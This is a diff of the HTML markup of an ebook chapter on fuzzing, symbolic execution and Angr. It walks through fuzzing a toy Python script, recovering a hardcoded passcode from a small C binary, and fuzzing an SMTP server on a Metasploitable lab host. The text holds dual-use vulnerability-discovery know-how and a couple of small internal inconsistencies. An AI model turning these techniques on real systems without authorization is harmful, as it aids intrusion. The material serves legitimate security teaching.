+		<pre>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">python3 App/fuzzExample.py &lt; TestInput/testInput1.txt</span></pre>
 		<p class="indent">If you’ve done everything correctly, your program should run without printing anything. If something does print out, read the error message and ensure that you’ve followed the instructions carefully.</p>
 		<p class="indent">Create two additional test files by running the following commands:</p>
-		<p class="programs">kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "2 5 7" &gt; TestInput/testInput2.txt</span><br/>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "10 10 10" &gt; TestInput/testInput3.txt</span></p>
+		<pre>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "2 5 7" &gt; TestInput/testInput2.txt</span><br/>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "10 10 10" &gt; TestInput/testInput3.txt</span></pre>
 		<h5 class="h5" id="ch09lev17"><strong>Fuzzing the Program</strong></h5>
-		<p class="noindent">Now that we’ve explored the code, let’s fuzz it. Here is the general format for running the <span class="literal">py-afl-fuzz</span> program:</p>
-		<p class="programs">py-afl-fuzz [ options ] -- python3 /path/to/fuzzed_app</p>
+		<p class="noindent">Now that we’ve explored the code, let’s fuzz it. Here is the general format for running the <code>py-afl-fuzz</code> program:</p>
+		<pre>py-afl-fuzz [ options ] -- python3 /path/to/fuzzed_app</pre>
 		<p class="indent">Before fuzzing your Python program, disable the AFL Fork Server functionality. This performance optimization is problematic for the Python AFL fuzzer, so run the following command to deactivate it:</p>
-		<p class="programs">kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">export AFL_NO_FORKSRV=1</span></p>
+		<pre>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">export AFL_NO_FORKSRV=1</span></pre>
 		<p class="indent">Now we can fuzz the Python file by running the following command:</p>
-		<p class="programs">kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">py-afl-fuzz -i TestInput/ -o Results/ -- python3 App/fuzzExample.py</span></p>
+		<pre>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">py-afl-fuzz -i TestInput/ -o Results/ -- python3 App/fuzzExample.py</span></pre>
 		<p class="indent">You should see the following screen, which should update in real time as the program is being fuzzed:</p>
-		<p class="programs">                    american fuzzy lop 2.57b (python3)<br/><br/>
+		<pre>                    american fuzzy lop 2.57b (python3)<br/><br/>
 --process timing --------------------------------------overall results ---<br/>
 |        run time : 0 days, 0 hrs, 0 min, 16 sec       |  cycles done : 0    |<br/>
 |   last new path : 0 days, 0 hrs, 0 min, 14 sec       |  total paths : 4    |<br/>
@@ -270,7 +270,7 @@
 |  dictionary : 0/0, 0/0, 0/0                         |  imported : n/a      |<br/>
 |       havoc : 0/0, 0/0                              | stability : 100.00%  |<br/>
 |        trim : 20.00%/1, 0.00%                       |----------------------|<br/>
-| [!] WARNING: error waitpid--------------------------|         [cpu000:103%]</p>
+| [!] WARNING: error waitpid--------------------------|         [cpu000:103%]</pre>
 		<p class="indent">To find the inputs that crashed your program, navigate to the <em>Crashes</em> folder inside the <em>Results</em> folder. This folder contains the input files that crashed the program. You’ll notice inputs like an empty file and a file with invalid characters. However, you should also notice a file with valid inputs that took the path discussed earlier, activating the assert statement.</p>
 		<h3 class="h3" id="ch09lev18"><strong>Symbolic Execution</strong></h3>
 		<p class="noindent">Wouldn’t it be amazing if we could analyze a program without executing it? <em>Symbolic execution</em> is a technique that uses symbols instead of real data to perform static analysis on a program. As the symbolic execution engine explores paths in a program, it builds path equations that can be solved to determine when a particular branch will be taken. <a href="ch09.xhtml#ch9fig6">Figure 9-6</a> shows the path constraints associated with the test function we explored earlier.</p>
@@ -278,28 +278,28 @@
 			<img alt="image" src="../images/ch09fig06.jpg"/>
 		</div>
 		<p class="figcap"><em>Figure 9-6: A computation tree that visualizes the execution paths and path constraints of the test function</em></p>
-		<p class="indent">To programmatically solve these path constraints, we use something called a <em>theorem prover</em>. A theorem prover answers questions like: Is there a value for <span class="literal">x</span> such that <span class="literal">x</span> <em>×</em> 5 == 15? If so, what is the value? The Z3 theorem prover is a popular prover developed by Microsoft. A detailed discussion of theorem proving is beyond the scope of this book, but we’ll consider it in the context of our test program.</p>
+		<p class="indent">To programmatically solve these path constraints, we use something called a <em>theorem prover</em>. A theorem prover answers questions like: Is there a value for <code>x</code> such that <code>x</code> <em>×</em> 5 == 15? If so, what is the value? The Z3 theorem prover is a popular prover developed by Microsoft. A detailed discussion of theorem proving is beyond the scope of this book, but we’ll consider it in the context of our test program.</p>
 		<h4 class="h4" id="ch09lev19"><span epub:type="pagebreak" id="page_175"/><strong><em>A Symbolic Execution of the Test Program</em></strong></h4>
 		<p class="noindent">The theorem prover helps discover inputs that activate each path by evaluating each path condition. Consider the path that leads to the failure state shown in <a href="ch09.xhtml#ch9fig6">Figure 9-6</a>. Let’s see how symbolic execution uses a theorem prover to identify that this is a reachable path.</p>
-		<p class="indent">First, the symbolic engine begins by symbolically executing the program. The inputs <span class="literal">a</span>, <span class="literal">b</span>, and <span class="literal">c</span> are replaced by symbolic values <em>α</em>, <em>β</em>, and <em>λ</em>. When the engine encounters the <span class="literal">if</span> statement <span class="literal">if (a):</span>, it asks the theorem prover if there is a value of <em>α</em> that would evaluate to true. If there is, the theorem prover would return yes. Similarly, we ask the theorem prover to see if there is a value of <em>α</em> that evaluates to false, to which the theorem prover would return yes. This means that the symbolic execution engine must explore both paths.</p>
-		<p class="indent">Assuming that the symbolic execution engine first explores the path where <em>α</em> evaluates to false, it will encounter another conditional: <span class="literal">if (b &lt; 5):</span>. This will result in a new path condition where <em>α</em> is not true and <em>β</em> is less than five.</p>
-		<p class="indent">Again, we ask the theorem prover if there exists a value for <em>α</em> and <em>β</em> for which this condition is either true or false, to which the theorem prover would return yes. Let’s assume that we explore the true branch. The symbolic engine will encounter the third and final conditional: <span class="literal">if (not a and c):</span>. This results in the final path constraint where <em>α</em> is not true, <em>β</em> is less than five, and <em>λ</em> is true. Now we can ask the theorem prover to return values of <em>α</em>, <em>β</em>, and <em>λ</em> for which this path condition is true. The theorem prover might very well return <em>α</em> = 0, <em>β</em> = 4 and <em>λ</em> = 1, the input that happens to get us to our failure state.</p>
+		<p class="indent">First, the symbolic engine begins by symbolically executing the program. The inputs <code>a</code>, <code>b</code>, and <code>c</code> are replaced by symbolic values <em>α</em>, <em>β</em>, and <em>λ</em>. When the engine encounters the <code>if</code> statement <code>if (a):</code>, it asks the theorem prover if there is a value of <em>α</em> that would evaluate to true. If there is, the theorem prover would return yes. Similarly, we ask the theorem prover to see if there is a value of <em>α</em> that evaluates to false, to which the theorem prover would return yes. This means that the symbolic execution engine must explore both paths.</p>
+		<p class="indent">Assuming that the symbolic execution engine first explores the path where <em>α</em> evaluates to false, it will encounter another conditional: <code>if (b &lt; 5):</code>. This will result in a new path condition where <em>α</em> is not true and <em>β</em> is less than five.</p>
+		<p class="indent">Again, we ask the theorem prover if there exists a value for <em>α</em> and <em>β</em> for which this condition is either true or false, to which the theorem prover would return yes. Let’s assume that we explore the true branch. The symbolic engine will encounter the third and final conditional: <code>if (not a and c):</code>. This results in the final path constraint where <em>α</em> is not true, <em>β</em> is less than five, and <em>λ</em> is true. Now we can ask the theorem prover to return values of <em>α</em>, <em>β</em>, and <em>λ</em> for which this path condition is true. The theorem prover might very well return <em>α</em> = 0, <em>β</em> = 4 and <em>λ</em> = 1, the input that happens to get us to our failure state.</p>
 		<p class="indent">The symbolic execution engine will repeat this process for all possible paths and generate a collection of test cases to execute all the paths.</p>
 		<h4 class="h4" id="ch09lev20"><strong><em>Limitations of Symbolic Execution</em></strong></h4>
 		<p class="noindent">However, there are constraints that the theorem prover can’t solve. Consider our discussion of the Diffie-Hellman key exchange algorithm from <a href="ch06.xhtml#ch6">Chapter 6</a>. Recall that recovering a private key from a public key would require solving the discrete inverse log problem. Consider this example function originally proposed by Mayur Naik at the University of Pennsylvania:</p>
-		<p class="programs">def test(x):<br/>
+		<pre>def test(x):<br/>
     c = q*p #Two large primes.<br/>
  <span class="ent">➊</span> if(pow(2,x) % c == 17):<br/>
         print("Error")<br/>
     else:<br/>
-        print("No Error")</p>
-		<p class="indent"><span epub:type="pagebreak" id="page_176"/>Evaluating the condition <span class="ent">➊</span> would require finding a value for <span class="literal">x</span> that would make the condition true, thus solving the following equation:</p>
+        print("No Error")</pre>
+		<p class="indent"><span epub:type="pagebreak" id="page_176"/>Evaluating the condition <span class="ent">➊</span> would require finding a value for <code>x</code> that would make the condition true, thus solving the following equation:</p>
 		<p class="center">2<em><sup>x</sup></em> mod <em>c</em> = 17</p>
 		<p class="indent">This is equivalent to solving the inverse log problem, and no one currently knows how to solve the inverse log problem efficiently.</p>
-		<p class="indent">If the theorem prover can’t evaluate a condition, it assumes that both the true and false options are possible, and the symbolic engine will explore both paths. However, this result is incorrect as a value of <span class="literal">x</span> that makes this condition true does not exist. This limitation leads the symbolic execution engine to explore paths that aren’t feasible. For this reason and others, symbolic execution does not scale for large programs.</p>
+		<p class="indent">If the theorem prover can’t evaluate a condition, it assumes that both the true and false options are possible, and the symbolic engine will explore both paths. However, this result is incorrect as a value of <code>x</code> that makes this condition true does not exist. This limitation leads the symbolic execution engine to explore paths that aren’t feasible. For this reason and others, symbolic execution does not scale for large programs.</p>
 		<p class="indent">As the number of paths grows, so does the number of path equations, which makes symbolic execution less feasible for large programs. Instead, testers often use a hybrid approach, called <em>concolic execution</em> or <em>dynamic symbolic execution</em>. One of the earliest such projects was the Symbolic PathFinder (SPF) developed by a team at NASA. These techniques combine the dynamic execution of fuzzing with the static analysis techniques used by symbolic execution.</p>
 		<h3 class="h3" id="ch09lev21"><strong>Dynamic Symbolic Execution</strong></h3>
-		<p class="noindent">Dynamic Symbolic Execution (DSE) combines dynamic execution techniques like fuzzing with ideas from symbolic execution. In addition to symbolic variables and path constraints, DSE keeps track of the concrete values supplied as the original input to the program, and it completely explores a path exercised by these concrete variables. The path constraints that result from this exploration are then used to generate new concrete variables that explore new paths. <a href="ch09.xhtml#ch9fig7">Figure 9-7</a> shows an example path taken by the DSE engine when concrete variables <span class="literal">a</span> = 0, <span class="literal">b</span> = 4, and <span class="literal">c</span> = 0 are used.</p>
+		<p class="noindent">Dynamic Symbolic Execution (DSE) combines dynamic execution techniques like fuzzing with ideas from symbolic execution. In addition to symbolic variables and path constraints, DSE keeps track of the concrete values supplied as the original input to the program, and it completely explores a path exercised by these concrete variables. The path constraints that result from this exploration are then used to generate new concrete variables that explore new paths. <a href="ch09.xhtml#ch9fig7">Figure 9-7</a> shows an example path taken by the DSE engine when concrete variables <code>a</code> = 0, <code>b</code> = 4, and <code>c</code> = 0 are used.</p>
 		<div class="image" id="ch9fig7">
 			<img alt="image" src="../images/ch09fig07.jpg"/>
 		</div>
@@ -339,7 +339,7 @@
 						<p class="tab">1</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab"><span class="literal">def testFunction(a,b,c):</span></p>
+						<p class="tab"><code>def testFunction(a,b,c):</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab-c"><em>a</em> = 0, <em>b</em> = 4, <em>c</em> = 0</p>
@@ -356,7 +356,7 @@
 						<p class="tab">2</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">    <span class="literal">x, y, z = 0, 0, 0</span></p>
+						<p class="tab">    <code>x, y, z = 0, 0, 0</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab-c"><em>x</em> = 0, <em>y</em> = 0, <em>z</em> = 0</p>
@@ -373,7 +373,7 @@
 						<p class="tab">3</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">    <span class="literal">if (a):</span></p>
+						<p class="tab">    <code>if (a):</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -390,7 +390,7 @@
 						<p class="tab">4</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">          <span class="literal">x = -2</span></p>
+						<p class="tab">          <code>x = -2</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -407,7 +407,7 @@
 						<p class="tab">5</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">    <span class="literal">if (b &lt; 5):</span></p>
+						<p class="tab">    <code>if (b &lt; 5):</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -424,7 +424,7 @@
 						<p class="tab">6</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">          <span class="literal">if (not a and c):</span></p>
+						<p class="tab">          <code>if (not a and c):</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -441,7 +441,7 @@
 						<p class="tab">7</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">                   <span class="literal">y = 1</span></p>
+						<p class="tab">                   <code>y = 1</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -458,7 +458,7 @@
 						<p class="tab">8</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">          <span class="literal">z = 2</span></p>
+						<p class="tab">          <code>z = 2</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab-c"><em>z</em> = 2</p>
@@ -475,7 +475,7 @@
 						<p class="tab">9</p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab">    <span class="literal">assert(x + y + z != 3)</span></p>
+						<p class="tab">    <code>assert(x + y + z != 3)</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -490,9 +490,9 @@
 			</tbody>
 		</table>
 		<p class="indent">At line 1, the values of <em>a</em>, <em>b</em>, and <em>c</em> are randomly initialized with the values 0, 4, and 0, respectively. As the DSE engine executes, it keeps track of each new variable it encounters, so when it gets to line 2, it stores <em>x</em> = 0, <em>y</em> = 0, and <em>z</em> = 0 in the collection of concrete variables.</p>
-		<p class="indent">At this point, the DSE engine moves to line 3, where it encounters the first <span class="literal">if</span> statement. Each new conditional statement results in the creation of a new path constraint and, if necessary, new symbolic variables. Here the DSE engine creates a new symbolic variable <em>α</em> = <em>a</em> to represent the concrete variable <em>a</em>, which has the value 0. Unlike a symbolic execution engine, which uses the theorem prover to decide whether to explore a branch, the DSE engine simply evaluates the condition by substituting the concrete variable. The condition <span class="literal">if(a)</span> reduces to <span class="literal">if(0)</span> because the value of <em>a</em> is 0. This easily evaluates to false, so the DSE engine also adds the path constraint <em>α</em> == <em>false</em> and does not take the branch. Because the condition evaluated to false, the DSE engine doesn’t execute line 4.</p>
-		<p class="indent">During the next step, the DSE engine encounters the second condition <span class="literal">if (b &lt; 5):</span> at line 5. Here, the DSE engine creates a symbolic variable <em>β</em> = <em>b</em> and uses the concrete value of <em>b</em> to determine whether to take the branch. In this case, <em>b</em> = 4, so the branch is taken. The DSE engine then adds the path constraint <em>β</em> less than five is true (<em>β</em> &lt; 5 == <em>true</em>) and moves on to the third and final condition at line 6.</p>
-		<p class="indent">Here, the DSE engine encounters a new variable <em>c</em>. It creates a new symbolic variable <em>λ</em> = <em>c</em> and evaluates the condition <span class="literal">if (not a and c):</span> using the concrete variables <em>a</em> = 2 and <em>c</em> = 0. In this case, the branch is not taken, so the DSE engine adds the path condition (<em><span class="ent">¬</span></em><em>α</em> <em><span class="ent">∧</span></em> λ) == <em>false</em>. The DSE engine then proceeds to line 8, where it updates the concrete variable <em>z</em> to store the value 2, and ends at line 9. In this case <em>z</em> = 2, <em>x</em> = 0, and <em>y</em> = 0, so the <span class="literal">assert</span> statement (<span class="literal">assert(x + y + z != 3)</span>) is not triggered.</p>
+		<p class="indent">At this point, the DSE engine moves to line 3, where it encounters the first <code>if</code> statement. Each new conditional statement results in the creation of a new path constraint and, if necessary, new symbolic variables. Here the DSE engine creates a new symbolic variable <em>α</em> = <em>a</em> to represent the concrete variable <em>a</em>, which has the value 0. Unlike a symbolic execution engine, which uses the theorem prover to decide whether to explore a branch, the DSE engine simply evaluates the condition by substituting the concrete variable. The condition <code>if(a)</code> reduces to <code>if(0)</code> because the value of <em>a</em> is 0. This easily evaluates to false, so the DSE engine also adds the path constraint <em>α</em> == <em>false</em> and does not take the branch. Because the condition evaluated to false, the DSE engine doesn’t execute line 4.</p>
+		<p class="indent">During the next step, the DSE engine encounters the second condition <code>if (b &lt; 5):</code> at line 5. Here, the DSE engine creates a symbolic variable <em>β</em> = <em>b</em> and uses the concrete value of <em>b</em> to determine whether to take the branch. In this case, <em>b</em> = 4, so the branch is taken. The DSE engine then adds the path constraint <em>β</em> less than five is true (<em>β</em> &lt; 5 == <em>true</em>) and moves on to the third and final condition at line 6.</p>
+		<p class="indent">Here, the DSE engine encounters a new variable <em>c</em>. It creates a new symbolic variable <em>λ</em> = <em>c</em> and evaluates the condition <code>if (not a and c):</code> using the concrete variables <em>a</em> = 2 and <em>c</em> = 0. In this case, the branch is not taken, so the DSE engine adds the path condition (<em><span class="ent">¬</span></em><em>α</em> <em><span class="ent">∧</span></em> λ) == <em>false</em>. The DSE engine then proceeds to line 8, where it updates the concrete variable <em>z</em> to store the value 2, and ends at line 9. In this case <em>z</em> = 2, <em>x</em> = 0, and <em>y</em> = 0, so the <code>assert</code> statement (<code>assert(x + y + z != 3)</code>) is not triggered.</p>
 		<p class="indent"><span epub:type="pagebreak" id="page_178"/>When the program gets to the end of a path, it backtracks to the last branch it took and negates the most recently added value in the path constraints. In our example, the new path condition would be <em>α</em> not true, <em>β</em> less than five, and <em>λ</em> is true, or in equation form:</p>
 		<p class="center"><span class="ent">¬</span><em>α</em> <span class="center">∧</span> (<em>β</em> &lt; 5) <span class="ent">∧</span> <em>λ</em></p>
 		<p class="noindent">Once the DSE engine has the new constraint, it uses the theorem prover to find the values for <em>α</em>, <em>β</em>, and <em>λ</em> that satisfy this equation. In this case, the solver might return <em>a</em> = 0, <em>b</em> = 4, and <em>c</em> = 1. These new values will allow the DSE engine to explore the other branch. <a href="ch09.xhtml#ch9fig8">Figure 9-8</a> illustrates backtracking to explore a new path.</p>
@@ -531,7 +531,7 @@
 			<tbody>
 				<tr>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab"><span class="literal">from hashlib import sha256<br/>def hashPass(x):<br/>    return sha256(x)</span></p>
+						<p class="tab"><code>from hashlib import sha256<br/>def hashPass(x):<br/>    return sha256(x)</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab"/>
@@ -545,7 +545,7 @@
 				</tr>
 				<tr>
 					<td class="borderr" style="vertical-align: top;">
-						<p class="tab"><span class="literal">def checkMatch(x,y):<br/>   z = hashPass(y)<br/>   if (x == z ):<br/>      assert(true)<br/>else:<br/>    assert(false)</span></p>
+						<p class="tab"><code>def checkMatch(x,y):<br/>   z = hashPass(y)<br/>   if (x == z ):<br/>      assert(true)<br/>else:<br/>    assert(false)</code></p>
 					</td>
 					<td class="borderr" style="vertical-align: top;">
 						<p class="tab-c"><em>x</em> = 2, <em>y</em> = 1<br/><em>z</em> = 6<em>b</em>....<em>b</em>4<em>b</em></p>
@@ -569,7 +569,7 @@
 		<h4 class="h4" id="ch09lev23"><strong><em>Creating an Executable Binary</em></strong></h4>
 		<p class="noindent">Create a folder on your Kali Linux Desktop called <em>Concolic</em> and create a new file within it called <em>simple.c</em>. This is the file we’ll compile.</p>
 		<p class="indent"><span epub:type="pagebreak" id="page_180"/>Copy the following code into the file:</p>
-		<p class="programs">#include &lt;stdio.h&gt;<br/><br/>void checkPass(int x){<br/>
+		<pre>#include &lt;stdio.h&gt;<br/><br/>void checkPass(int x){<br/>
    if(x == 7857){<br/>
       printf("Access Granted");<br/>
    }else{<br/>
@@ -580,29 +580,29 @@
     printf("Enter the password: ");<br/>
     scanf("%d", &amp;x);<br/>
     checkPass(x);<br/>
-}</p>
-		<p class="indent">This program is implemented in the C programming language. The program prompts the user to enter a password and then checks to see if the password matches <span class="literal">7857</span> (the correct value). If the password matches, the program prints <span class="literal">Access Granted</span>. Otherwise, it prints <span class="literal">Access Denied</span>.</p>
+}</pre>
+		<p class="indent">This program is implemented in the C programming language. The program prompts the user to enter a password and then checks to see if the password matches <code>7857</code> (the correct value). If the password matches, the program prints <code>Access Granted</code>. Otherwise, it prints <code>Access Denied</code>.</p>
 		<p class="indent">Open a terminal and navigate to the <em>Concolic</em> folder you created on your Desktop:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Concolic/</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Concolic/</span></pre>
 		<p class="indent">Compile the <em>simple.c</em> program to create a binary (the file that contains the machine code) by running the following command:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">gcc -o simple simple.c</span></p>
-		<p class="indent">This program runs the <span class="literal">gcc</span> compiler that comes preinstalled on Kali Linux, which will compile the <em>simple.c</em> file and output (<span class="literal">-o</span>) a binary called <em>simple</em>. Test your new binary by running the following:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">./simple</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">gcc -o simple simple.c</span></pre>
+		<p class="indent">This program runs the <code>gcc</code> compiler that comes preinstalled on Kali Linux, which will compile the <em>simple.c</em> file and output (<code>-o</code>) a binary called <em>simple</em>. Test your new binary by running the following:</p>
+		<pre>kali@kali:~$ <span class="codestrong1">./simple</span></pre>
 		<h4 class="h4" id="ch09lev24"><strong><em>Installing and Running Angr</em></strong></h4>
-		<p class="noindent">We recommend that you run Angr within a virtual Python environment. A virtual environment isolates the libraries that Angr uses from the libraries in your regular environment, which reduces errors caused by conflicting versions of libraries. Run the following command to install Python’s virtual environment wrapper (<span class="literal">virtualenvwrapper</span>) and its dependencies:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span></p>
+		<p class="noindent">We recommend that you run Angr within a virtual Python environment. A virtual environment isolates the libraries that Angr uses from the libraries in your regular environment, which reduces errors caused by conflicting versions of libraries. Run the following command to install Python’s virtual environment wrapper (<code>virtualenvwrapper</code>) and its dependencies:</p>
+		<pre>kali@kali:~$ <span class="codestrong1">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span></pre>
 		<p class="indent"><span epub:type="pagebreak" id="page_181"/>Next, configure the terminal and activate the virtual environment wrapper, which will allow you to create new virtual environments:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</span></p>
-		<p class="indent">Now create a new virtual environment called <span class="literal">angrEnv</span> and set it up to use Python 3:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">mkvirtualenv --python=$(which python3) angrEnv</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</span></pre>
+		<p class="indent">Now create a new virtual environment called <code>angrEnv</code> and set it up to use Python 3:</p>
+		<pre>kali@kali:~$ <span class="codestrong1">mkvirtualenv --python=$(which python3) angrEnv</span></pre>
 		<p class="indent">Lastly, install Angr in this new environment:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">pip3 install angr</span></p>
-		<p class="indent">If you set everything up correctly, you should see the <span class="literal">angrEnv</span> label in your terminal as follows:</p>
-		<p class="programs">(angrEnv) kali@kali:~/Desktop/Concolic$</p>
+		<pre>kali@kali:~$ <span class="codestrong1">pip3 install angr</span></pre>
+		<p class="indent">If you set everything up correctly, you should see the <code>angrEnv</code> label in your terminal as follows:</p>
+		<pre>(angrEnv) kali@kali:~/Desktop/Concolic$</pre>
 		<p class="indent">Angr is well documented, so before you continue, I recommend that you read the core concept section of the Angr documentation. Also try completing the Python interactive shell exercises listed at <em><a href="https://docs.angr.io/core-concepts/toplevel/">https://docs.angr.io/core-concepts/toplevel/</a></em>.</p>
 		<h4 class="h4" id="ch09lev25"><strong><em>The Angr Program</em></strong></h4>
 		<p class="noindent">Now let’s write the Python program that will use Angr to automatically discover the passcode in the program we wrote. Create a new file on your Desktop called <em>angrSim.py</em> and save the following code snippet to it:</p>
-		<p class="programs">   import angr<br/>
+		<pre>   import angr<br/>
    import sys<br/><span class="ent">➊</span> project = angr.Project('simple')<br/><span class="ent">➋</span> initial_state = project.factory.entry_state()<br/>
    simulation = project.factory.simgr(initial_state)<br/><br/><span class="ent">➌</span> def is_successful(state):<br/>
        stdout_output = state.posix.dumps(sys.stdout.fileno())<br/>
@@ -613,48 +613,48 @@
        solution_state = simulation.found[0]<br/>
        print("Found solution")<br/>
     <span class="ent">➏</span> print(solution_state.posix.dumps(sys.stdin.fileno()))<br/><span epub:type="pagebreak" id="page_182"/>else:<br/>
-     raise Exception('Could not find the password')</p>
+     raise Exception('Could not find the password')</pre>
 		<p class="indent">We import the binary from the <em>simple.c</em> program as an Angr project <span class="ent">➊</span>. Before we continue, keep in mind that the symbolic variables you’ll inspect will be bit vectors representing the contents of the symbolic registers. This is because you’re symbolic executing a binary rather than source code.</p>
-		<p class="indent">Next, we obtain the initial entry state of the program <span class="ent">➋</span>. We then pass this state to a simulation manager (<span class="literal">simgr</span>) that will manage the process of simulating program execution. If you wanted to manually simulate the program, you could run <span class="literal">simulation.step()</span>, which would allow you to inspect the state and path constraints at each execution step. The Angr documentation walks through this process with a simple example.</p>
-		<p class="indent">Now, we define a function that identifies the success state <span class="ent">➌</span>. If the state would output the string <span class="literal">Access Granted</span>, the function returns true. Next, we define the function that identifies a failure state <span class="ent">➍</span>. If a state would output the string <span class="literal">Access Denied</span>, the function returns true.</p>
+		<p class="indent">Next, we obtain the initial entry state of the program <span class="ent">➋</span>. We then pass this state to a simulation manager (<code>simgr</code>) that will manage the process of simulating program execution. If you wanted to manually simulate the program, you could run <code>simulation.step()</code>, which would allow you to inspect the state and path constraints at each execution step. The Angr documentation walks through this process with a simple example.</p>
+		<p class="indent">Now, we define a function that identifies the success state <span class="ent">➌</span>. If the state would output the string <code>Access Granted</code>, the function returns true. Next, we define the function that identifies a failure state <span class="ent">➍</span>. If a state would output the string <code>Access Denied</code>, the function returns true.</p>
 		<p class="indent">Now we can start the concolic execution process. Then, we pass the function pointers to the success and failure functions ”. If the simulation reaches the failure state, it quickly terminates and restarts the search. However, if the simulation discovers the success state, it terminates and saves the state. Finally, we print the input that caused us to enter the success state, and voila, we have the password <span class="ent">➏</span>.</p>
 		<p class="indent">Using the terminal, run the <em>angrSim.py</em> program:</p>
-		<p class="programs">(angrEnv) kali@kali:~/Desktop/Concolic$ <span class="codestrong1">python3 angrSim.py</span></p>
+		<pre>(angrEnv) kali@kali:~/Desktop/Concolic$ <span class="codestrong1">python3 angrSim.py</span></pre>
 		<p class="indent">This will take some time to run. When it’s complete, you should see the following output:</p>
-		<p class="programs">It is being loaded with a base address of 0x400000.<br/>Found solution<br/>b'0000007857'</p>
+		<pre>It is being loaded with a base address of 0x400000.<br/>Found solution<br/>b'0000007857'</pre>
 		<p class="indent">Congratulations, you’ve used the Angr concolic engine to discover the input that gets you to your success state.</p>
 		<h3 class="h3" id="ch09lev26"><strong>Exercises</strong></h3>
 		<p class="noindent">These exercises are designed to round out your understanding of concolic execution and fuzzing. The exercises are listed in order of difficulty, and I recommend attempting the more difficult exercises to help you truly master these topics. Happy hunting.</p>
 		<h4 class="h4" id="ch09lev27"><strong><em>Capture the Flag Games with Angr</em></strong></h4>
 		<p class="noindent">In this chapter, we looked at only a small fraction of what Angr is capable of. You can expand your understanding of this tool by completing the Angr <span epub:type="pagebreak" id="page_183"/><em>Capture the Flag</em> challenges created by Jake Springer. The repository of challenges at <em><a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a></em> also contains solutions, so feel free to check your work after attempting a challenge. Complete all 17 challenges to really master Angr.</p>
 		<h4 class="h4" id="ch09lev28"><strong><em>Fuzzing Web Protocols</em></strong></h4>
-		<p class="noindent">We’ve explored how to fuzz binaries. Now let’s look at an easy way to fuzz network protocols using the <span class="literal">spike</span> tool that comes preinstalled on your Kali Linux virtual machine. Here is the command’s general syntax:</p>
-		<p class="programs">generic_web_server_fuzz [<span class="codeitalic">target-IP</span>] [<span class="codeitalic">port</span>] [<span class="codeitalic">spikescript</span>] [<span class="codeitalic">variable index</span>]    [<br/>
+		<p class="noindent">We’ve explored how to fuzz binaries. Now let’s look at an easy way to fuzz network protocols using the <code>spike</code> tool that comes preinstalled on your Kali Linux virtual machine. Here is the command’s general syntax:</p>
+		<pre>generic_web_server_fuzz [<span class="codeitalic">target-IP</span>] [<span class="codeitalic">port</span>] [<span class="codeitalic">spikescript</span>] [<span class="codeitalic">variable index</span>]    [<br/>
     
-			<img alt="image" src="../images/arrow01.jpg"/> <span class="codeitalic">strings index</span>]</p>
+			<img alt="image" src="../images/arrow01.jpg"/> <span class="codeitalic">strings index</span>]</pre>
 		<p class="indent">Begin by specifying the host machines you want to fuzz (for example, the Metasploitable server). Next, specify the port used by the protocol you’d like to fuzz. For instance, you could try fuzzing the SMTP server running on port 25.</p>
 		<p class="indent">The spike fuzzer doesn’t know structure of the SMTP protocol, so you’ll need to supply a spike script that defines the message it needs to send. This script will consist of a collection of strings to send and the variables to mutate. You can write your own fuzzing scripts or use the scripts included in the directory <em>/usr/share/spike/audits/</em>. We’ll look at an example script more closely later in this exercise.</p>
-		<p class="indent">The <span class="literal"><em>[variable index]</em></span> specifies the starting location in the script. For example, a variable index value of 0 would start fuzzing with the first variable in the script, whereas a value of 3 would leave the first three values unmutated and begin by mutating the fourth variable in script.</p>
